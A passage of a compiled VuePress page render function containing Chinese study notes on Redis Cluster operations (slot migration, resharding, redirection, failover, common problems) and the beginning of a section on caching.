\"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"槽迁移计划\")]),s._v(\" \"),t(\"li\",[s._v(\"迁移数据\")]),s._v(\" \"),t(\"li\",[s._v(\"添加从节点\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"迁移数据\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#迁移数据\"}},[s._v(\"#\")]),s._v(\" 迁移数据\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"对目标节点发送：\"),t(\"code\",[s._v(\"cluster setslot {slot} importing {sourceNodeId}\")]),s._v(\"命令，让目标节点准备导入槽的数据\")]),s._v(\" \"),t(\"li\",[s._v(\"对源节点发送：\"),t(\"code\",[s._v(\"cluster setslot {slot} migrating {targetNodeId}\")]),s._v(\"命令，让源节点准备迁出槽的数据\")]),s._v(\" \"),t(\"li\",[s._v(\"源节点循环执行\"),t(\"code\",[s._v(\"cluster getkeysinslot {slot} {count}\")]),s._v(\"命令，每次获取 count 个属于槽的键\")]),s._v(\" \"),t(\"li\",[s._v(\"在源节点上执行\"),t(\"code\",[s._v(\"migrate {targetIp} {targetPort} key 0 {timeout}\")]),s._v(\"命令把指定 key 迁移\")]),s._v(\" \"),t(\"li\",[s._v(\"重复执行步骤 3-4 直到槽下所有数据迁移到目标节点\")]),s._v(\" \"),t(\"li\",[s._v(\"向集群内所有主节点发送\"),t(\"code\",[s._v(\"cluster setslot {slot} node {targetNodeId}\")]),s._v(\"命令，通知槽分配给目标节点\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"收缩集群\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#收缩集群\"}},[s._v(\"#\")]),s._v(\" 收缩集群\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"下线迁移槽\")]),s._v(\" \"),t(\"li\",[s._v(\"忘记节点\")]),s._v(\" \"),t(\"li\",[s._v(\"关闭节点\")])]),s._v(\" \"),t(\"p\",[s._v(\"Redis Cluster 5.0 之后使用\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-cli --cluster reshard --cluster-from \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\" --cluster-to \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7000}\")]),s._v(\" --cluster-slots \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1365\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7006\\nredis-cli --cluster reshard --cluster-from \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\" --cluster-to \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7001}\")]),s._v(\" --cluster-slots \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1366\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7006\\nredis-cli --cluster reshard --cluster-from \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\" --cluster-to \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7002}\")]),s._v(\" --cluster-slots \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1365\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7006\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#cluster forget {downNodeId}\")]),s._v(\"\\nredis-cli --cluster del-node \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000 \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7007}\")]),s._v(\"\\nredis-cli --cluster del-node \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000 \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\")])]),t(\"p\",[s._v(\"Redis Cluster 5.0 之前使用\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#redis-trib\")]),s._v(\"\\nredis-trib.rb reshard --from \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\" --to \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7000}\")]),s._v(\" --slots \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1365\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7006\\nredis-trib.rb reshard --from \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\" --to \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7001}\")]),s._v(\" --slots \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1366\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7006\\nredis-trib.rb reshard --from \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\" --to \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7002}\")]),s._v(\" --slots \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1365\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7006\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#cluster forget {downNodeId}\")]),s._v(\"\\nredis-trib.rb del-node \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000 \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7007}\")]),s._v(\"\\nredis-trib.rb del-node \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000 \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"客户端路由\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#客户端路由\"}},[s._v(\"#\")]),s._v(\" 客户端路由\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"moved-重定向\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#moved-重定向\"}},[s._v(\"#\")]),s._v(\" moved 重定向\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-cli -c -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\"\\ncluster keyslot key\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"ask-重定向\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#ask-重定向\"}},[s._v(\"#\")]),s._v(\" ask 重定向\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"smart-客户端\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#smart-客户端\"}},[s._v(\"#\")]),s._v(\" smart 客户端\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"从集群中选一个可运行节点，使用\"),t(\"code\",[s._v(\"cluster slots\")]),s._v(\"初始化槽和节点映射\")]),s._v(\" \"),t(\"li\",[s._v(\"将\"),t(\"code\",[s._v(\"cluster slots\")]),s._v(\"的结果映射到本地，为每个节点创建 JedisPool\")]),s._v(\" \"),t(\"li\",[s._v(\"准备执行命令\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"批量操作优化\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#批量操作优化\"}},[s._v(\"#\")]),s._v(\" 批量操作优化\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"串行 mget\")]),s._v(\" \"),t(\"li\",[s._v(\"串行 IO\")]),s._v(\" \"),t(\"li\",[s._v(\"并行 IO\")]),s._v(\" \"),t(\"li\",[s._v(\"hash_tag\\n\"),t(\"table\",[t(\"thead\",[t(\"tr\",[t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"方案\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"优点\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"缺点\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"网络 IO\")])])]),s._v(\" \"),t(\"tbody\",[t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"串行 mget\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"编程简单 \"),t(\"br\"),s._v(\" 少量 keys 满足需求\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"大量 keys 请求延迟严重\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"O(keys)\")])]),s._v(\" \"),t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"串行 IO\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"编程简单 \"),t(\"br\"),s._v(\" 少量节点满足需求\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"大量 node 延迟严重\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"O(nodes)\")])]),s._v(\" \"),t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"并行 IO\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"采用并行特性\"),t(\"br\"),s._v(\" 延迟取决于最慢的节点\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"编程复杂\"),t(\"br\"),s._v(\"超时定位问题难\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"O(max_slow(node))\")])]),s._v(\" \"),t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"hash_tag\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"性能最高\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"读写增加 tag 维护成本 tag 分布易出现数据倾斜\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"O(1)\")])])])])])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"故障\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#故障\"}},[s._v(\"#\")]),s._v(\" 故障\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"故障发现\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#故障发现\"}},[s._v(\"#\")]),s._v(\" 故障发现\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"通过 ping/pong 消息实现故障发现：不需要 sentinel\")]),s._v(\" \"),t(\"li\",[s._v(\"主观下线和客观下线\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"主观下线\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#主观下线\"}},[s._v(\"#\")]),s._v(\" 主观下线\")]),s._v(\" \"),t(\"p\",[s._v('某个节点认为另一个节点不可用，\"偏见\"')]),s._v(\" \"),t(\"h4\",{attrs:{id:\"客观下线\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#客观下线\"}},[s._v(\"#\")]),s._v(\" 客观下线\")]),s._v(\" \"),t(\"p\",[s._v(\"当半数以上持有槽的主节点都标记某节点主观下线\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"尝试客观下线\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#尝试客观下线\"}},[s._v(\"#\")]),s._v(\" 尝试客观下线\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"通知集群内所有节点标记故障节点为客观下线\")]),s._v(\" \"),t(\"li\",[s._v(\"通知故障节点的从节点触发故障转移流程\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"故障恢复\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#故障恢复\"}},[s._v(\"#\")]),s._v(\" 故障恢复\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[t(\"p\",[s._v(\"资格检查\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"每个从节点检查与故障主节点的断线时间\")]),s._v(\" \"),t(\"li\",[s._v(\"超过 cluster-node-timeout * cluster-slave-validity-factor 取消资格\")]),s._v(\" \"),t(\"li\",[s._v(\"cluster-slave-validity-factor:默认是 10\")])])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"准备选举时间\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"选举投票\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"替换主节点\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"当前从节点取消复制变为主节点\"),t(\"code\",[s._v(\"slaveof no one\")])]),s._v(\" \"),t(\"li\",[s._v(\"执行 slusterDelSlot 撤销故障主节点负责的槽，并执行 clusterAddSlot 把这些槽分配给自己\")]),s._v(\" \"),t(\"li\",[s._v(\"向集群广播自己的 pong 消息，表明已经替换了故障从节点\")])])])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"故障模拟\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#故障模拟\"}},[s._v(\"#\")]),s._v(\" 故障模拟\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"kill -9 节点模拟宕机\")]),s._v(\" \"),t(\"li\",[s._v(\"观察客户端故障恢复时间\")]),s._v(\" \"),t(\"li\",[s._v(\"观察各个节点的日志\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"常见问题-4\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#常见问题-4\"}},[s._v(\"#\")]),s._v(\" 常见问题\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"集群完整性\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#集群完整性\"}},[s._v(\"#\")]),s._v(\" 集群完整性\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"cluster-require-full-coverage 默认为 yes\\n\"),t(\"ul\",[t(\"li\",[s._v(\"集群中 16384 个槽全部可用：保证集群完整性\")]),s._v(\" \"),t(\"li\",[s._v(\"节点故障或者正在故障转移：(err) CLUSTERDOWN The cluster is down\")])])]),s._v(\" \"),t(\"li\",[s._v(\"大部分业务无法容忍，cluster-require-full-coverage 建议设置为 no\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"带宽消耗\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#带宽消耗\"}},[s._v(\"#\")]),s._v(\" 带宽消耗\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"官方建议：1000 个节点\")]),s._v(\" \"),t(\"li\",[s._v(\"PING/PONG 消息\")]),s._v(\" \"),t(\"li\",[s._v(\"不容忽视的带宽消耗\")])]),s._v(\" \"),t(\"p\",[s._v(\"消息发送频率：节点发现和其他节点最后通信消息超过 cluster-node-timeout/2 时会直接发送 ping 消息\")]),s._v(\" \"),t(\"p\",[s._v(\"消息数据量：slots 槽数组(2KB 空间)和整个集群 1/10 的状态数据(10 个节点状态数据约 1KB)\")]),s._v(\" \"),t(\"p\",[s._v(\"节点部署的机器规模：集群分布的机器越多且每台机器划分的节点数越均匀，则集群内整体的可用带宽越高\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"优化\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#优化\"}},[s._v(\"#\")]),s._v(\" 优化\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v('避免\"大\"集群：避免多业务使用一个集群，大业务可以多集群')]),s._v(\" \"),t(\"li\",[s._v(\"cluster-node-timeout：带宽和故障转移速度的均衡\")]),s._v(\" \"),t(\"li\",[s._v(\"尽量均匀分配到多机器上：保证高可用和带宽\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"pub-sub-广播\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#pub-sub-广播\"}},[s._v(\"#\")]),s._v(\" Pub/Sub 广播\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"问题：publish 在集群每个节点广播：加重带宽\")]),s._v(\" \"),t(\"li\",[s._v('解决：单独\"走\"一套 Redis Sentinel')])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"数据倾斜\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#数据倾斜\"}},[s._v(\"#\")]),s._v(\" 数据倾斜\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"数据倾斜：内存不均\\n\"),t(\"ul\",[t(\"li\",[s._v(\"节点和槽分配不均\\n\"),t(\"ul\",[t(\"li\",[t(\"code\",[s._v(\"redis-trib.rb info ip:port\")]),s._v(\"查看节点、槽、键值分布\")]),s._v(\" \"),t(\"li\",[t(\"code\",[s._v(\"redis-trib.rb rebalance ip:port\")]),s._v(\"进行均衡(谨慎使用)\")])])]),s._v(\" \"),t(\"li\",[s._v(\"不同槽对应键值数量差异较大\\n\"),t(\"ul\",[t(\"li\",[s._v(\"CRC16 正常情况下比较均匀\")]),s._v(\" \"),t(\"li\",[s._v(\"可能存在 hash_tag\")]),s._v(\" \"),t(\"li\",[t(\"code\",[s._v(\"cluster countkeysinslot {slot}\")]),s._v(\"获取槽对应键值个数\")])])]),s._v(\" \"),t(\"li\",[s._v(\"包含 bigkey\\n\"),t(\"ul\",[t(\"li\",[s._v(\"bigkey：例如大字符串、几百万的元素的 hash、set 等\")]),s._v(\" \"),t(\"li\",[s._v(\"从节点：\"),t(\"code\",[s._v(\"redis-cli --bigkeys\")])]),s._v(\" \"),t(\"li\",[s._v(\"优化：优化数据结构\")])])]),s._v(\" \"),t(\"li\",[s._v(\"内存相关配置不一致\\n\"),t(\"ul\",[t(\"li\",[s._v(\"hash-max-ziplist-value、set-max-intset-entries 等\")]),s._v(\" \"),t(\"li\",[s._v('优化：定期\"检查\"配置一致性')])])])])]),s._v(\" \"),t(\"li\",[s._v(\"请求倾斜：热点\\n\"),t(\"ul\",[t(\"li\",[s._v(\"热点 key：重要 key 或者 bigkey\")]),s._v(\" \"),t(\"li\",[s._v(\"优化：\\n\"),t(\"ul\",[t(\"li\",[s._v(\"避免 bigkey\")]),s._v(\" \"),t(\"li\",[s._v(\"热键不要用 hash_tag\")]),s._v(\" \"),t(\"li\",[s._v(\"当一致性不高时，可以用本地缓存 + MQ\")])])])])])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"读写分离-2\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#读写分离-2\"}},[s._v(\"#\")]),s._v(\" 读写分离\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"只读连接：集群模式的从节点不接受任何读写请求\\n\"),t(\"ul\",[t(\"li\",[s._v(\"重定向到复制槽的主节点\")]),s._v(\" \"),t(\"li\",[t(\"code\",[s._v(\"readonly\")]),s._v(\"命令可以读：连接级别命令\")])])]),s._v(\" \"),t(\"li\",[s._v(\"读写分离：更加复杂\\n\"),t(\"ul\",[t(\"li\",[s._v(\"同样的问题：复制延迟、读取过期数据、从节点故障\")]),s._v(\" \"),t(\"li\",[s._v(\"修改客户端 :cluster slaves {nodeId}\")])])])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"数据迁移\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#数据迁移\"}},[s._v(\"#\")]),s._v(\" 数据迁移\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"官方迁移：redis-trib.rb import\\n\"),t(\"ul\",[t(\"li\",[s._v(\"只能从单机迁移到集群\")]),s._v(\" \"),t(\"li\",[s._v(\"不支持在线迁移：source 需要停写\")]),s._v(\" \"),t(\"li\",[s._v(\"不支持断点续传\")]),s._v(\" \"),t(\"li\",[s._v(\"单线程迁移：影响速度\")])])]),s._v(\" \"),t(\"li\",[s._v(\"在线迁移：\\n\"),t(\"ul\",[t(\"li\",[s._v(\"唯品会：redis-migrate-tool\")]),s._v(\" \"),t(\"li\",[s._v(\"豌豆荚：redis-port\")])])])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-trib.rb \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"import\")]),s._v(\" --from \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:6388 --copy \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"集群限制\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#集群限制\"}},[s._v(\"#\")]),s._v(\" 集群限制\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"key 批量操作支持有限：例如 mget、mset 必须在一个 slot\")]),s._v(\" \"),t(\"li\",[s._v(\"key 事务和 Lua 支持有限：操作的 key 必须在一个节点\")]),s._v(\" \"),t(\"li\",[s._v(\"key 是数据分区的最小粒度：不支持 bigkey 分区\")]),s._v(\" \"),t(\"li\",[s._v(\"不支持多个数据库：集群模式下只有一个 db 0\")]),s._v(\" \"),t(\"li\",[s._v(\"复制只支持一层：不支持树形复制结构\")])]),s._v(\" \"),t(\"p\",[s._v('Redis Cluster：满足容量和性能的扩展性，很多业务\"不需要\"')]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v('大多数时客户端性能会\"降低\"')]),s._v(\" \"),t(\"li\",[s._v(\"命令无法跨 节点使用：megt、keys、scan、flush、sinter 等\")]),s._v(\" \"),t(\"li\",[s._v(\"Lua 和事务无法跨节点使用\")]),s._v(\" \"),t(\"li\",[s._v(\"客户端维护更复杂：SDK 和应用本身消耗(例如更多的连接池)\")])]),s._v(\" \"),t(\"p\",[s._v(\"很多场景 Redis Cluster 已经足够好\")]),s._v(\" \"),t(\"h2\",{attrs:{id:\"缓存\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#缓存\"}},[s._v(\"#\")]),s._v(\" 缓存\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"好处和成本\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#好处和成本\"}},[s._v(\"#\")]),s._v(\" 好处和成本\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"好处\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#好处\"}},[s._v(\"#\")]),s._v(\" 好处\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"加速读写\")])]),s._v(\" \"),t(\"p\",[s._v(\"通过缓存加速读写速度：CPU L1/L2/L3 Cache、Linux page Cache、Linux 加速硬盘读写、浏览器缓存、Ehcache 缓存数据库结果\")]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"降低后端负载\")])]),s._v(\" \"),t(\"p\",[s._v(\"后端服务器通过前端缓存降低负载：业务端使用 Redis 降低后端 MySQL 负载等\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"成本\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#成本\"}},[s._v(\"#\")]),s._v(\" 成本\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"数据不一致：缓存层和数据层有时间窗口不一致，和更新策略有关\")]),s._v(\" \"),t(\"li\",[s._v(\"代码维护成本：多了一层缓存逻辑\")]),s._v(\" \"),t(\"li\",[s._v(\"运维成本：例如 Redis Cluster\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"使用场景\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#使用场景\"}},[s._v(\"#\")]),s._v(\" 使用场景\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"降低后端负载：对高消耗的 SQL：join 结果集/分组统计结果缓存\")]),s._v(\" \"),t(\"li\",[s._v(\"加速请求响应：利用 Redis/Memcache 优化 IO 响应时间\")]),s._v(\" \"),t(\"li\",[s._v(\"大量写合并为批量写：如计数器先 Redis 累计再批量写 DB\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"更新策略\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#更新策略\"}},[s._v(\"#\")]),s._v(\" 更新策略\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"LRU/LFU/FIFO 算法剔除：例如 maxmemory-policy\")]),s._v(\" \"),t(\"li\",[s._v(\"超时剔除：例如 expire\")]),s._v(\" \"),t(\"li\",[s._v(\"主动更新：开发控制生命周期\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"缓存粒度\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#缓存粒度\"}},[s._v(\"#\")]),s._v(\" 缓存粒度\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"通用性：全量属性更好\")]),s._v(\" \"),t(\"li\",[s._v(\"占用空间：部分属性更好\")]),s._v(\" \"),t(\"li\",[s._v(\"代码维护：表面上全量属性更好\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"缓存穿透\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#缓存穿透\"}},[s._v(\"#\")]),s._v(\" 缓存穿透\")]),s._v(\" \"),t(\"p\",[s._v(\"大量请求不命中\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"原因\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#原因\"}},[s._v(\"#\")]),s._v(\" 原因\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"业务代码自身问题\")]),s._v(\" \"),t(\"li\",[s._v(\"恶意攻击、爬虫等等\")])]),s._v(\" 